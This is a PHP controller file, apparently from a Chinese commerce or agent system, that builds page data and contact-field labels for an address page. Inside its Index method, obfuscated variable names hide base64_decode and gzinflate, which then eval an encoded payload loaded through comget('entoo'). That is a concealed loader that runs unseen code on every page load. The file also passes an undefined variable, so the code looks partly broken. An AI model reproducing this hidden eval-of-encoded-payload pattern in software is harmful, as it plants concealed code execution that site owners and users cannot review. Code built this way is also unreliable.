<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
class AddrController extends Controller
{

				public $hander = NULL;

				public function __construct( )
				{
								$this->hander = factory::getinstance( "agents" );
				}

				public function Index( )
				{
								$R71a664ef8c = $this->PageInfo( );
								$data = array(
												"forykt" => intval( request( "forykt" ) ),
												"forb2b" => intval( request( "forb2b" ) ),
												"forb2c" => intval( request( "forb2c" ) )
								);
								$data = array_merge( $data, $R71a664ef8c );
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "entoo" ) ) ) );
								$this->FillPage( $data, $R4e420efcc3 );
								$R00be52aa45 = array( "company" => "公司名称", "arealname" => "联系人", "aqq" => "QQ", "amail" => "邮箱", "atel" => "电话", "mobile" => "手机", "aaddr" => "住址", "prv" => "省", "city" => "市", "zip" => "邮编" );
								$this->Assign( "sarray", $R00be52aa45 );
							
												$this->View( );
							
				}

}

?>
